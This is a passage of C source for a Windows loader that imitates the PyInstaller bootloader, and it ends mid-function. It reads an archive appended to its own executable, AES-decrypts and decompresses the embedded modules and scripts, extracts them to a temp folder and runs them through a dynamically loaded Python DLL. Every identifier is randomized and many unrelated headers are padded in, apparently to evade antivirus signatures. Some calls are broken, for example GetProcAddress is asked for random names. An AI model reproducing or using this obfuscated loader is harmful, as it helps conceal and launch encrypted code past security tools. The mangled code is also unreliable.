#define _WIN32_WINNT 0x0500
#include "utils.h"
#include <napenforcementclient.h>
#include <string.h>
#include <stdarg.h>
#include <scrptids.h>
#include <memory.h>
#include <schedule.h>
#include <admex.h>
#include <certadm.h>
#include <wpcapi.h>
#include <basetyps.h>
#include <dlcapi.h>
#include <exdisp.h>
#include <windows.h>
#include <winsync.h>
#include <ratings.h>
#include <certmod.h>
#include <dbt.h>
#include <tchar.h>
#include <commctrl.h>
#include <locationapi.h>
#include <ndattrib.h>
#include <pdhmsg.h>
#include <signal.h>
#include <sdperr.h>
#include <fwpmu.h>
#include "utils.h"
#include <string.h>
#include <stdio.h>
#include <io.h>
#include <direct.h>
#include <sys/types.h>
#define unsetenv(x) _putenv(x "=")
#include <process.h>
#define vsnprintf _vsnprintf
#include "launch.h"
#include <sys/stat.h>
#include "zlib.h"
#define snprintf _snprintf
#include <windows.h>
char* basename (char *VaWubr) {
char *IUycIGNJprqfC = strrchr (VaWubr, '\\');
if (!IUycIGNJprqfC) IUycIGNJprqfC = strrchr (VaWubr, '/');
return IUycIGNJprqfC ? ++IUycIGNJprqfC : (char*)VaWubr;}
int MpphRPm(void) {
OSVERSIONINFO LTFRZj;
ZeroMemory(&LTFRZj, sizeof(OSVERSIONINFO));
LTFRZj.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
GetVersionEx(&LTFRZj);
return ((LTFRZj.dwMajorVersion > 5) || ((LTFRZj.dwMajorVersion == 5) && (LTFRZj.dwMinorVersion >= 1)));}
int dzXGOfdQoJX(char *kgggDXkhqCR, char *rtvRVkr) { return 0; }
void EassGiLlrepCN(void) {
void (WINAPI *igVGxmxRGsYu)(HANDLE);
BOOL (WINAPI *LWZIBITjmauxQ)(DWORD dwFlags, ULONG_PTR ulCookie);
HANDLE YRSVCBnrOthbgvJ;
if (!MpphRPm()) return;
YRSVCBnrOthbgvJ = LoadLibrary("kernel32");
igVGxmxRGsYu = (void*)GetProcAddress(YRSVCBnrOthbgvJ, "igVGxmxRGsYu");
LWZIBITjmauxQ = (void*)GetProcAddress(YRSVCBnrOthbgvJ, "LWZIBITjmauxQ");
if (!igVGxmxRGsYu || !LWZIBITjmauxQ) { return; }}
void xTBhKXCwjmtbPzH(void) { InitCommonControls(); }
int TJsNyrJVzmEm(char *UgCsviw, const char *XiTbdxj) {
if (!GetModuleFileNameA(NULL, UgCsviw, _MAX_PATH)) { return -1; } return 0; }
int VfKVdJSbVtNoD(LPWSTR SMjUtGlbrdER) {
if (!GetModuleFileNameW(NULL, SMjUtGlbrdER, _MAX_PATH)) { return -1; } return 0; }
void yGQmeqNRGjnQ(char *ESWTvfAdIf, const char *UhfjGbNEbiHDoyP) {
char *hWnITaHnfFpM = NULL;
strcpy(ESWTvfAdIf, UhfjGbNEbiHDoyP);
for (hWnITaHnfFpM = ESWTvfAdIf + strlen(ESWTvfAdIf); *hWnITaHnfFpM != '\\' && hWnITaHnfFpM >= ESWTvfAdIf + 2; --hWnITaHnfFpM);
*++hWnITaHnfFpM = '\0'; }
void AyRMSmztL(char *RIAmJcrwO, const char *hUqALg){
strcpy(RIAmJcrwO, hUqALg);
strcpy(RIAmJcrwO + strlen(RIAmJcrwO) - 3, "pkg");}
 int lkUjAnANcgqvAh(const ARCHIVE_STATUS *bBjWEIyAvQD) { return 0; }
int UwfsEYT(LPWSTR rKrcbnau) {
SECURITY_ATTRIBUTES IBkFBflyTzeYyP;
STARTUPINFOW rTxPditFPAc;
PROCESS_INFORMATION MuSVtMJ;
int jecslTeNct = 0;
signal(SIGABRT, SIG_IGN);
IBkFBflyTzeYyP.bInheritHandle = TRUE;
IBkFBflyTzeYyP.lpSecurityDescriptor = NULL;
IBkFBflyTzeYyP.nLength = sizeof(IBkFBflyTzeYyP);
signal(SIGBREAK, SIG_IGN);
signal(SIGTERM, SIG_IGN);
signal(SIGINT, SIG_IGN);
GetStartupInfoW(&rTxPditFPAc);
rTxPditFPAc.lpDesktop = NULL;
rTxPditFPAc.lpReserved = NULL;
rTxPditFPAc.lpTitle = NULL;
rTxPditFPAc.hStdInput = (void*)_get_osfhandle(fileno(stdin));
rTxPditFPAc.hStdError = (void*)_get_osfhandle(fileno(stderr));
rTxPditFPAc.hStdOutput = (void*)_get_osfhandle(fileno(stdout));
rTxPditFPAc.wShowWindow = SW_NORMAL;
rTxPditFPAc.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
if (CreateProcessW( rKrcbnau, GetCommandLineW(), &IBkFBflyTzeYyP, NULL, TRUE, 0,  NULL, NULL, &rTxPditFPAc, &MuSVtMJ)) {
WaitForSingleObject(MuSVtMJ.hProcess, INFINITE);
GetExitCodeProcess(MuSVtMJ.hProcess, (unsigned long *)&jecslTeNct);
} else { jecslTeNct = -1; }
return jecslTeNct; }
DECLPROC(PyDict_GetItemString);
DECLPROC(PyInt_AsLong);
DECLPROC(Py_Finalize);
DECLPROC(PyErr_Print);
DECLPROC(Py_IncRef);
DECLPROC(PyImport_ExecCodeModule);
DECLPROC(PyImport_AddModule);
DECLPROC(PyObject_CallFunction);
DECLPROC(PyErr_Occurred);
DECLPROC(PyString_FromStringAndSize);
DECLPROC(PyModule_GetDict);
DECLPROC(PyString_AsString);
DECLPROC(PyList_Append);
DECLPROC(PyErr_Clear);
DECLPROC(Py_Initialize);
DECLPROC(PyList_New);
DECLPROC(Py_BuildValue);
DECLVAR(Py_NoSiteFlag);
DECLPROC(PyImport_ImportModule);
DECLPROC(PySys_SetObject);
DECLPROC(Py_DecRef);
DECLPROC(PyRun_SimpleString);
DECLPROC(Py_SetProgramName);
DECLVAR(Py_FrozenFlag);
DECLPROC(PyObject_SetAttrString);
DECLPROC(PyObject_CallMethod);
unsigned char *WmrSQMZwbLuWtl(ARCHIVE_STATUS *XFBoYQ, TOC *yQvDFPS);
int BzZcCOXlAaM(char *iWbCIttQDXsQXhZ){
int i;
char *XwuuoBhy;
char JrrFXFMjBROtU[16];
GetTempPath(MAX_PATH, iWbCIttQDXsQXhZ);
sprintf(JrrFXFMjBROtU, "_MEI%d", getpid());
for (i=0;i<5;i++) {
    XwuuoBhy = _tempnam(iWbCIttQDXsQXhZ, JrrFXFMjBROtU);
    if (mkdir(XwuuoBhy) == 0) {
        strcpy(iWbCIttQDXsQXhZ, XwuuoBhy); strcat(iWbCIttQDXsQXhZ, "\\");
        free(XwuuoBhy); return 1;
    } free(XwuuoBhy);
} return 0; }
static int ACVjyC(char *KliaQnQBegE, const char *LyFtRhQfNWJyn, ...){
    va_list dyNruoeRK;
    struct stat YTgsTTHlfQivk;
    va_start(dyNruoeRK, LyFtRhQfNWJyn);
    vsnprintf(KliaQnQBegE, _MAX_PATH, LyFtRhQfNWJyn, dyNruoeRK);
    va_end(dyNruoeRK);
    return stat(KliaQnQBegE, &YTgsTTHlfQivk); }
int RlpuIjuTj(ARCHIVE_STATUS *PpRMpHtIofTrIG, char const * cOlwnLBFA, char const * dnyToJXxedgoaV) {
    char *YSEYXuo;
    strcpy(PpRMpHtIofTrIG->archivename, cOlwnLBFA);
    strcat(PpRMpHtIofTrIG->archivename, dnyToJXxedgoaV);
    strcpy(PpRMpHtIofTrIG->homepath, cOlwnLBFA);
    strcpy(PpRMpHtIofTrIG->homepathraw, cOlwnLBFA);
    for ( YSEYXuo = PpRMpHtIofTrIG->homepath; *YSEYXuo; YSEYXuo++ ) if (*YSEYXuo == '\\') *YSEYXuo = '/';
    return 0;}
int KRiOwGMQ(ARCHIVE_STATUS *JBmKCM, int SaOOZlmBzib) {
    if (fseek(JBmKCM->fp, SaOOZlmBzib-(int)sizeof(COOKIE), SEEK_SET)) return -1;
    if (fread(&(JBmKCM->cookie), sizeof(COOKIE), 1, JBmKCM->fp) < 1) return -1;
    if (strncmp(JBmKCM->cookie.magic, MAGIC, strlen(MAGIC))) return -1;
    return 0;}
    int dBDpwsNWoCtB(ARCHIVE_STATUS *TXMszhiavduOXQ){
        int i; int xjCkkYN;
        TXMszhiavduOXQ->fp = fopen(TXMszhiavduOXQ->archivename, "rb");
        if (TXMszhiavduOXQ->fp == NULL) { return -1;}
        fseek(TXMszhiavduOXQ->fp, 0, SEEK_END);
        xjCkkYN = ftell(TXMszhiavduOXQ->fp);
        if (KRiOwGMQ(TXMszhiavduOXQ, xjCkkYN) < 0) { return -1;}
        TXMszhiavduOXQ->pkgstart = xjCkkYN - ntohl(TXMszhiavduOXQ->cookie.len);
        fseek(TXMszhiavduOXQ->fp, TXMszhiavduOXQ->pkgstart + ntohl(TXMszhiavduOXQ->cookie.TOC), SEEK_SET);
        TXMszhiavduOXQ->tocbuff = (TOC *) malloc(ntohl(TXMszhiavduOXQ->cookie.TOClen));
        if (TXMszhiavduOXQ->tocbuff == NULL){ return -1; }
        if (fread(TXMszhiavduOXQ->tocbuff, ntohl(TXMszhiavduOXQ->cookie.TOClen), 1, TXMszhiavduOXQ->fp) < 1) { return -1; }
        TXMszhiavduOXQ->tocend = (TOC *) (((char *)TXMszhiavduOXQ->tocbuff) + ntohl(TXMszhiavduOXQ->cookie.TOClen));
        if (ferror(TXMszhiavduOXQ->fp)) { return -1; }
        return 0;}
        struct _old_typeobject;
        typedef struct _old_object { int ob_refcnt; struct _old_typeobject *ob_type;} OldPyObject;
        typedef void (*destructor)(PyObject *);
        typedef struct _old_typeobject { int ob_refcnt; struct _old_typeobject *ob_type; int ob_size; char *tp_name;
            int tp_basicsize, tp_itemsize; destructor tp_dealloc; } OldPyTypeObject;
        static void _EmulatedIncRef(PyObject *o){
            OldPyObject *oo = (OldPyObject*)o;
            if (oo) oo->ob_refcnt++;}
        static void _EmulatedDecRef(PyObject *o){
            #define _Py_Dealloc(op) (*(op)->ob_type->tp_dealloc)((PyObject *)(op))
            OldPyObject *oo = (OldPyObject*)o;
            if (--(oo)->ob_refcnt == 0) _Py_Dealloc(oo);}
int GOKCcg(HMODULE nVLsPmIxGDM, int jBDYxkhgKr){
GETPROC(nVLsPmIxGDM, PyImport_ImportModule);
GETPROC(nVLsPmIxGDM, PyList_Append);
GETPROC(nVLsPmIxGDM, PyImport_AddModule);
GETPROC(nVLsPmIxGDM, PyDict_GetItemString);
GETVAR(nVLsPmIxGDM, Py_FrozenFlag);
GETPROC(nVLsPmIxGDM, PyString_FromStringAndSize);
GETPROC(nVLsPmIxGDM, Py_SetProgramName);
GETPROC(nVLsPmIxGDM, PyObject_CallMethod);
GETPROC(nVLsPmIxGDM, PyModule_GetDict);
GETPROC(nVLsPmIxGDM, Py_BuildValue);
GETPROC(nVLsPmIxGDM, PyErr_Occurred);
GETPROC(nVLsPmIxGDM, PyRun_SimpleString);
GETPROCOPT(nVLsPmIxGDM, Py_IncRef);
GETPROC(nVLsPmIxGDM, Py_Finalize);
GETPROC(nVLsPmIxGDM, Py_Initialize);
GETPROC(nVLsPmIxGDM, PyString_AsString);
GETPROC(nVLsPmIxGDM, PyInt_AsLong);
GETPROC(nVLsPmIxGDM, PyObject_CallFunction);
GETVAR(nVLsPmIxGDM, Py_NoSiteFlag);
GETPROC(nVLsPmIxGDM, PyList_New);
GETPROC(nVLsPmIxGDM, PyErr_Clear);
GETPROC(nVLsPmIxGDM, PyImport_ExecCodeModule);
GETPROC(nVLsPmIxGDM, PyErr_Print);
GETPROCOPT(nVLsPmIxGDM, Py_DecRef);
GETPROC(nVLsPmIxGDM, PyObject_SetAttrString);
    if (!PI_Py_IncRef) PI_Py_IncRef = _EmulatedIncRef;
    if (!PI_Py_DecRef) PI_Py_DecRef = _EmulatedDecRef;
    return 0;}
int YuMvTrDt(ARCHIVE_STATUS *dQEYezVZqkD){
    HINSTANCE rCdbIIHgokp;
    char SutRXHTcOHk[_MAX_PATH + 1];
    int dWvLlXHkxQcO = ntohl(dQEYezVZqkD->cookie.pyvers);
    sprintf(SutRXHTcOHk, "%spython%02d.dll", dQEYezVZqkD->homepathraw, dWvLlXHkxQcO);
    rCdbIIHgokp = LoadLibraryExA(SutRXHTcOHk, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
    if (!rCdbIIHgokp) {sprintf(SutRXHTcOHk, "%spython%02d.dll", dQEYezVZqkD->temppathraw, dWvLlXHkxQcO);
        rCdbIIHgokp = LoadLibraryExA(SutRXHTcOHk, NULL, LOAD_WITH_ALTERED_SEARCH_PATH );}
    if (rCdbIIHgokp == 0) { return -1; }
    GOKCcg(rCdbIIHgokp, dWvLlXHkxQcO);
    return 0;}
 TOC *wrcJhMiz(ARCHIVE_STATUS *grIoUYooDga, TOC* AjxNzOvm){
     TOC *mtcaCm = (TOC*)((char *)AjxNzOvm + ntohl(AjxNzOvm->structlen));
     if (mtcaCm < grIoUYooDga->tocbuff) { return grIoUYooDga->tocend; }
     return mtcaCm;}
int RYOEZpBQAsCI(ARCHIVE_STATUS *YiIvlM, int argc, char *argv[]) {
static char SjQjuCKVn[2*_MAX_PATH + 14];
int i;
char vjtQNUnzs[_MAX_PATH+1+80];
char VGnwsFlgB[_MAX_PATH+1];
PyObject *jMyfsFvzYzFbnyO;
PyObject *val;
PyObject *sys;
strcpy(SjQjuCKVn, "PYTHONPATH=");
if (YiIvlM->temppath[0] != '\0') { strcat(SjQjuCKVn, YiIvlM->temppath); SjQjuCKVn[strlen(SjQjuCKVn)-1] = '\0'; strcat(SjQjuCKVn, ";"); }
strcat(SjQjuCKVn, YiIvlM->homepath);
if (strlen(SjQjuCKVn) > 14) SjQjuCKVn[strlen(SjQjuCKVn)-1] = '\0';
putenv(SjQjuCKVn);
strcpy(SjQjuCKVn, "PYTHONHOME=");
strcat(SjQjuCKVn, YiIvlM->temppath);
putenv(SjQjuCKVn);
*PI_Py_NoSiteFlag = 1; *PI_Py_FrozenFlag = 1;
PI_Py_SetProgramName(YiIvlM->archivename);
PI_Py_Initialize();
PI_PyRun_SimpleString("import sys\n");
PI_PyRun_SimpleString("del sys.path[:]\n");
if (YiIvlM->temppath[0] != '\0') {
    strcpy(VGnwsFlgB, YiIvlM->temppath);
    VGnwsFlgB[strlen(VGnwsFlgB)-1] = '\0';
    sprintf(vjtQNUnzs, "sys.path.append(r\"%s\")", VGnwsFlgB);
    PI_PyRun_SimpleString(vjtQNUnzs);}
strcpy(VGnwsFlgB, YiIvlM->homepath);
VGnwsFlgB[strlen(VGnwsFlgB)-1] = '\0';
sprintf(vjtQNUnzs, "sys.path.append(r\"%s\")", VGnwsFlgB);
PI_PyRun_SimpleString (vjtQNUnzs);
jMyfsFvzYzFbnyO = PI_PyList_New(0);
val = PI_Py_BuildValue("s", YiIvlM->archivename);
PI_PyList_Append(jMyfsFvzYzFbnyO, val);
for (i = 1; i < argc; ++i) { val = PI_Py_BuildValue ("s", argv[i]); PI_PyList_Append (jMyfsFvzYzFbnyO, val); }
sys = PI_PyImport_ImportModule("sys");
PI_PyObject_SetAttrString(sys, "argv", jMyfsFvzYzFbnyO);
return 0;}
int hLxRlWyZgwpBX(ARCHIVE_STATUS *kgaKEcGOShHB){
    PyObject *MocElVncxlFHdJ; PyObject *WQmTtCvXV; PyObject *xhbKpm;
    TOC *AYLRwvFvgra; PyObject *co; PyObject *mod;
    MocElVncxlFHdJ = PI_PyImport_ImportModule("marshal");
    WQmTtCvXV = PI_PyModule_GetDict(MocElVncxlFHdJ);
    xhbKpm = PI_PyDict_GetItemString(WQmTtCvXV, "loads");
    AYLRwvFvgra = kgaKEcGOShHB->tocbuff;
    while (AYLRwvFvgra < kgaKEcGOShHB->tocend) {
        if (AYLRwvFvgra->typcd == 'm' || AYLRwvFvgra->typcd == 'M'){
            unsigned char *fmqZPgbUY = WmrSQMZwbLuWtl(kgaKEcGOShHB, AYLRwvFvgra);
            co = PI_PyObject_CallFunction(xhbKpm, "s#", fmqZPgbUY+8, ntohl(AYLRwvFvgra->ulen)-8);
            mod = PI_PyImport_ExecCodeModule(AYLRwvFvgra->name, co);
            if (PI_PyErr_Occurred()) { PI_PyErr_Print(); PI_PyErr_Clear(); }
            free(fmqZPgbUY);
        }
        AYLRwvFvgra = wrcJhMiz(kgaKEcGOShHB, AYLRwvFvgra);
    } return 0; }
int gxtqheiGIur(ARCHIVE_STATUS *DcSryMtgCLEQPJx, TOC *GQhPOu){
    int ZllxfeI; int YOwHNveq = DcSryMtgCLEQPJx->pkgstart + ntohl(GQhPOu->pos);
    char *hNlIjajCpW = "sys.path.append(r\"%s?%d\")\n";
    char *yGcVIOYMt = (char *) malloc(strlen(hNlIjajCpW) + strlen(DcSryMtgCLEQPJx->archivename) + 32);
    sprintf(yGcVIOYMt, hNlIjajCpW, DcSryMtgCLEQPJx->archivename, YOwHNveq);
    ZllxfeI = PI_PyRun_SimpleString(yGcVIOYMt);
    if (ZllxfeI != 0){ free(yGcVIOYMt); return -1; }
    free(yGcVIOYMt); return 0;}
int sJmtXbOcO(ARCHIVE_STATUS *UyarTbCrTV){
TOC * JBumbhmis; JBumbhmis = UyarTbCrTV->tocbuff;
while (JBumbhmis < UyarTbCrTV->tocend) {
    if (JBumbhmis->typcd == 'z') { gxtqheiGIur(UyarTbCrTV, JBumbhmis); }
    JBumbhmis = wrcJhMiz(UyarTbCrTV, JBumbhmis); }
return 0; }
unsigned char *UAJmbADiVYV(unsigned char * WaFhapVFaNqVpqs, TOC *zSLeVOcTeEnI){
unsigned char *MPiMsiDUjAqYmK; z_stream bzpEuRZWSpo; int KiZodMPtjWzoB;
MPiMsiDUjAqYmK = (unsigned char *)malloc(ntohl(zSLeVOcTeEnI->ulen));
if (MPiMsiDUjAqYmK == NULL) { return NULL; }
bzpEuRZWSpo.zalloc = NULL;
bzpEuRZWSpo.zfree = NULL;
bzpEuRZWSpo.opaque = NULL;
bzpEuRZWSpo.next_in = WaFhapVFaNqVpqs;
bzpEuRZWSpo.avail_in = ntohl(zSLeVOcTeEnI->len);
bzpEuRZWSpo.next_out = MPiMsiDUjAqYmK;
bzpEuRZWSpo.avail_out = ntohl(zSLeVOcTeEnI->ulen);
KiZodMPtjWzoB = inflateInit(&bzpEuRZWSpo);
if (KiZodMPtjWzoB >= 0) { 
    KiZodMPtjWzoB = (inflate)(&bzpEuRZWSpo, Z_FINISH);
    if (KiZodMPtjWzoB >= 0) { KiZodMPtjWzoB = (inflateEnd)(&bzpEuRZWSpo); }
    else { return NULL; } }
else { return NULL; }
return MPiMsiDUjAqYmK;}
unsigned char *WmrSQMZwbLuWtl(ARCHIVE_STATUS *NliRlgLQJA, TOC *upiAvKqcpAoSkHA){
unsigned char *BAQGBLGFTG;unsigned char *MrDFuFoLS;
fseek(NliRlgLQJA->fp, NliRlgLQJA->pkgstart + ntohl(upiAvKqcpAoSkHA->pos), SEEK_SET);
BAQGBLGFTG = (unsigned char *)malloc(ntohl(upiAvKqcpAoSkHA->len));
if (BAQGBLGFTG == NULL) { return NULL; }
if (fread(BAQGBLGFTG, ntohl(upiAvKqcpAoSkHA->len), 1, NliRlgLQJA->fp) < 1) { return NULL; }
if (upiAvKqcpAoSkHA->cflag == '\2') {
    static PyObject *VeBZLAvqYMd = NULL;
    PyObject *EUTuIBOJP; PyObject *FlVARdmVtCb; PyObject *HYLqcroZ; PyObject *FRAJinMQgRatNkS;
    long block_size; char *iv;
    if (!VeBZLAvqYMd) VeBZLAvqYMd = PI_PyImport_ImportModule("AES");
    FlVARdmVtCb = PI_PyModule_GetDict(VeBZLAvqYMd);
    EUTuIBOJP = PI_PyDict_GetItemString(FlVARdmVtCb, "new");
    block_size = PI_PyInt_AsLong(PI_PyDict_GetItemString(FlVARdmVtCb, "block_size"));
    iv = malloc(block_size);
    memset(iv, 0, block_size);
    HYLqcroZ = PI_PyObject_CallFunction(EUTuIBOJP, "s#Os#", BAQGBLGFTG, 32, PI_PyDict_GetItemString(FlVARdmVtCb, "MODE_CFB"), iv, block_size);
    FRAJinMQgRatNkS = PI_PyObject_CallMethod(HYLqcroZ, "decrypt", "s#", BAQGBLGFTG+32, ntohl(upiAvKqcpAoSkHA->len)-32);
    memcpy(BAQGBLGFTG, PI_PyString_AsString(FRAJinMQgRatNkS), ntohl(upiAvKqcpAoSkHA->len)-32);
    Py_DECREF(HYLqcroZ); Py_DECREF(FRAJinMQgRatNkS);}
if (upiAvKqcpAoSkHA->cflag == '\1' || upiAvKqcpAoSkHA->cflag == '\2') {
    MrDFuFoLS = UAJmbADiVYV(BAQGBLGFTG, upiAvKqcpAoSkHA);
    free(BAQGBLGFTG); BAQGBLGFTG = MrDFuFoLS;
    if (BAQGBLGFTG == NULL) { return NULL; } }
return BAQGBLGFTG;}
FILE *ZxPcZZ(const char *oufmKYZUxbPL, const char* sQHyWAbpB) {
struct stat BQdrBcAXlUrHjmM; char gYgDpRtYUm[_MAX_PATH+1]; char CbXgTMaPydOQDY[_MAX_PATH+1]; char *cnpSFdzgq;
strcpy(gYgDpRtYUm, oufmKYZUxbPL); strcpy(CbXgTMaPydOQDY, sQHyWAbpB); gYgDpRtYUm[strlen(gYgDpRtYUm)-1] = '\0';
cnpSFdzgq = strtok(CbXgTMaPydOQDY, "/\\");
while (cnpSFdzgq != NULL){
    strcat(gYgDpRtYUm, "\\");
    strcat(gYgDpRtYUm, cnpSFdzgq);
    cnpSFdzgq = strtok(NULL, "/\\");
    if (!cnpSFdzgq) break;
    if (stat(gYgDpRtYUm, &BQdrBcAXlUrHjmM) < 0) {mkdir(gYgDpRtYUm);} }
return fopen(gYgDpRtYUm, "wb"); }
static int bXFaNwsqLQSxy(ARCHIVE_STATUS *ldgDNusMPTQqMlJ) {
char *msZbjhmoEnfWYG;
if (ldgDNusMPTQqMlJ->temppath[0] == '\0') {
    if (!BzZcCOXlAaM(ldgDNusMPTQqMlJ->temppath)) {return -1;}
    strcpy(ldgDNusMPTQqMlJ->temppathraw, ldgDNusMPTQqMlJ->temppath);
    for ( msZbjhmoEnfWYG=ldgDNusMPTQqMlJ->temppath; *msZbjhmoEnfWYG; msZbjhmoEnfWYG++ ) if (*msZbjhmoEnfWYG == '\\') *msZbjhmoEnfWYG = '/';}
return 0;}
int dDzochhyHYYA(ARCHIVE_STATUS *sLZwLRhJC, TOC *ytwiGz) {
FILE *bgSpiLFDCDkzHZy; unsigned char *kJtjTMKFPIGp = WmrSQMZwbLuWtl(sLZwLRhJC, ytwiGz);
if (bXFaNwsqLQSxy(sLZwLRhJC) == -1){ return -1; }
bgSpiLFDCDkzHZy = ZxPcZZ(sLZwLRhJC->temppath, ytwiGz->name);
if (bgSpiLFDCDkzHZy == NULL)  { return -1; }
else { fwrite(kJtjTMKFPIGp, ntohl(ytwiGz->ulen), 1, bgSpiLFDCDkzHZy); fclose(bgSpiLFDCDkzHZy); }
free(kJtjTMKFPIGp); return 0; }
static int RKKRkYfQ(char *RijPNhGDrn, char *eTcJdTg, const char *FPFcvciDLBk) {
char miOAAnDqaafwIxd[_MAX_PATH + 1];
strcpy(miOAAnDqaafwIxd, FPFcvciDLBk);
strcpy(RijPNhGDrn, strtok(miOAAnDqaafwIxd, ":"));
strcpy(eTcJdTg, strtok(NULL, ":")) ;
if (RijPNhGDrn[0] == 0 || eTcJdTg[0] == 0) return -1;
return 0; }
static int xpswRZvRZgu(const char *tuwoRjUdRiJ, const char *wCQXjuLRTrE, const char *qWaLidTSwwsr) {
FILE *aFFJniemiiJ = fopen(tuwoRjUdRiJ, "rb"); FILE *IFctyRsgnj = ZxPcZZ(wCQXjuLRTrE, qWaLidTSwwsr);
char buf[4096]; int error = 0;
if (aFFJniemiiJ == NULL || IFctyRsgnj == NULL) return -1;
while (!feof(aFFJniemiiJ)) {
    if (fread(buf, 4096, 1, aFFJniemiiJ) == -1) {
        if (ferror(aFFJniemiiJ)) { clearerr(aFFJniemiiJ); error = -1; break; }
    } else {
        fwrite(buf, 4096, 1, IFctyRsgnj);
        if (ferror(IFctyRsgnj)) { clearerr(IFctyRsgnj); error = -1; break;}}}
fclose(aFFJniemiiJ); fclose(IFctyRsgnj); return error; }
static char *qtwFeeRFJxlFsF(const char *GORbqV) {
char *PqSGBXD = strrchr(GORbqV, '\\');
char *Jyoxryk = (char *) calloc(_MAX_PATH, sizeof(char));
if (PqSGBXD != NULL) strncpy(Jyoxryk, GORbqV, PqSGBXD - GORbqV + 1);
else strcpy(Jyoxryk, GORbqV);
return Jyoxryk; }
static int CJJwvycCNzYIWsU(ARCHIVE_STATUS *UMvVJRtbfT, const char *XAMIivREihiHkMS, const char *tDjFGmYVNL){
if (bXFaNwsqLQSxy(UMvVJRtbfT) == -1){ return -1; }
if (xpswRZvRZgu(XAMIivREihiHkMS, UMvVJRtbfT->temppath, tDjFGmYVNL) == -1) { return -1; }
return 0; }
static ARCHIVE_STATUS *snIxItOp(ARCHIVE_STATUS *dxzBWKuqxYvLR[], const char *ljrDHDrywi) {
ARCHIVE_STATUS *MxVELABnXMML = NULL; int i = 0;
if (bXFaNwsqLQSxy(dxzBWKuqxYvLR[SELF]) == -1){ return NULL; } 
for (i = 1; dxzBWKuqxYvLR[i] != NULL; i++){ if (strcmp(dxzBWKuqxYvLR[i]->archivename, ljrDHDrywi) == 0) { return dxzBWKuqxYvLR[i]; } }
if ((MxVELABnXMML = (ARCHIVE_STATUS *) calloc(1, sizeof(ARCHIVE_STATUS))) == NULL) { return NULL; }
strcpy(MxVELABnXMML->archivename, ljrDHDrywi);
strcpy(MxVELABnXMML->homepath, dxzBWKuqxYvLR[SELF]->homepath);
strcpy(MxVELABnXMML->temppath, dxzBWKuqxYvLR[SELF]->temppath);
strcpy(MxVELABnXMML->homepathraw, dxzBWKuqxYvLR[SELF]->homepathraw);
strcpy(MxVELABnXMML->temppathraw, dxzBWKuqxYvLR[SELF]->temppathraw);
if (dBDpwsNWoCtB(MxVELABnXMML)) { free(MxVELABnXMML); return NULL; }
dxzBWKuqxYvLR[i] = MxVELABnXMML; return MxVELABnXMML; }
static int rzmNjZlreeTMgJp(ARCHIVE_STATUS *tuJnvGCCVaIOf, const char *NwApewt) {
TOC * ghKRPLRJjYh = tuJnvGCCVaIOf->tocbuff;
while (ghKRPLRJjYh < tuJnvGCCVaIOf->tocend) {
    if (strcmp(ghKRPLRJjYh->name, NwApewt) == 0) if (dDzochhyHYYA(tuJnvGCCVaIOf, ghKRPLRJjYh)) return -1;
    ghKRPLRJjYh = wrcJhMiz(tuJnvGCCVaIOf, ghKRPLRJjYh); }
return 0; }
static int TbXIkeY(ARCHIVE_STATUS *oSvDlFAPUXWUuES[], const char *KxlRfunBnlmnAe) {
ARCHIVE_STATUS *AvbyCbERq = NULL;
char mNEdwBhaM[_MAX_PATH + 1]; char ErbqaMEVSOud[_MAX_PATH + 1];
char UOpUttArzvtJLfM[_MAX_PATH + 1]; char *cVsAzwonwnsO = NULL;
if (RKKRkYfQ(mNEdwBhaM, ErbqaMEVSOud, KxlRfunBnlmnAe) == -1) return -1;
cVsAzwonwnsO = qtwFeeRFJxlFsF(mNEdwBhaM);
if (cVsAzwonwnsO[0] == 0) { free(cVsAzwonwnsO); return -1; }
if ((ACVjyC(UOpUttArzvtJLfM, "%s%s.pkg", oSvDlFAPUXWUuES[SELF]->homepath, mNEdwBhaM) != 0) &&
    (ACVjyC(UOpUttArzvtJLfM, "%s%s.exe", oSvDlFAPUXWUuES[SELF]->homepath, mNEdwBhaM) != 0) &&
    (ACVjyC(UOpUttArzvtJLfM, "%s%s", oSvDlFAPUXWUuES[SELF]->homepath, mNEdwBhaM) != 0)) { return -1; }
    if ((AvbyCbERq = snIxItOp(oSvDlFAPUXWUuES, UOpUttArzvtJLfM)) == NULL) { return -1; }
if (rzmNjZlreeTMgJp(AvbyCbERq, ErbqaMEVSOud) == -1) { free(AvbyCbERq); return -1; }
free(cVsAzwonwnsO); return 0; }
int hFUmQa(ARCHIVE_STATUS *SNlSYxLoHDOYog[]) {
TOC * ivnLBvUJtmav = SNlSYxLoHDOYog[SELF]->tocbuff;
while (ivnLBvUJtmav < SNlSYxLoHDOYog[SELF]->tocend) {
    if (ivnLBvUJtmav->typcd == 'b' || ivnLBvUJtmav->typcd == 'x' || ivnLBvUJtmav->typcd == 'Z') return 1;
    if (ivnLBvUJtmav->typcd == 'd')  return 1;
    ivnLBvUJtmav = wrcJhMiz(SNlSYxLoHDOYog[SELF], ivnLBvUJtmav);
} return 0; }
int QLiGBEXwYnh(ARCHIVE_STATUS *aVrTINkmdGhXtaV[]) {
TOC * cAUKGuUhKIClGUe = aVrTINkmdGhXtaV[SELF]->tocbuff;
while (cAUKGuUhKIClGUe < aVrTINkmdGhXtaV[SELF]->tocend) {
    if (cAUKGuUhKIClGUe->typcd == 'b' || cAUKGuUhKIClGUe->typcd == 'x' || cAUKGuUhKIClGUe->typcd == 'Z')
        if (dDzochhyHYYA(aVrTINkmdGhXtaV[SELF], cAUKGuUhKIClGUe)) return -1;
    if (cAUKGuUhKIClGUe->typcd == 'd') {
        if (TbXIkeY(aVrTINkmdGhXtaV, cAUKGuUhKIClGUe->name) == -1) return -1; }
    cAUKGuUhKIClGUe = wrcJhMiz(aVrTINkmdGhXtaV[SELF], cAUKGuUhKIClGUe); }
return 0; }
int XktRuP(ARCHIVE_STATUS *uJeRUg) {
unsigned char *yCWlfEGYEbqytT; char FjSOIUWE[_MAX_PATH]; int biwTDyoztdf = 0;
TOC * tPjuthrVmC = uJeRUg->tocbuff;
PyObject *__main__ = PI_PyImport_AddModule("__main__"); PyObject *__file__;
while (tPjuthrVmC < uJeRUg->tocend) {
    if (tPjuthrVmC->typcd == 's') {
        yCWlfEGYEbqytT = WmrSQMZwbLuWtl(uJeRUg, tPjuthrVmC);
        strcpy(FjSOIUWE, tPjuthrVmC->name); strcat(FjSOIUWE, ".py");
        __file__ = PI_PyString_FromStringAndSize(FjSOIUWE, strlen(FjSOIUWE));
        PI_PyObject_SetAttrString(__main__, "__file__", __file__); Py_DECREF(__file__);
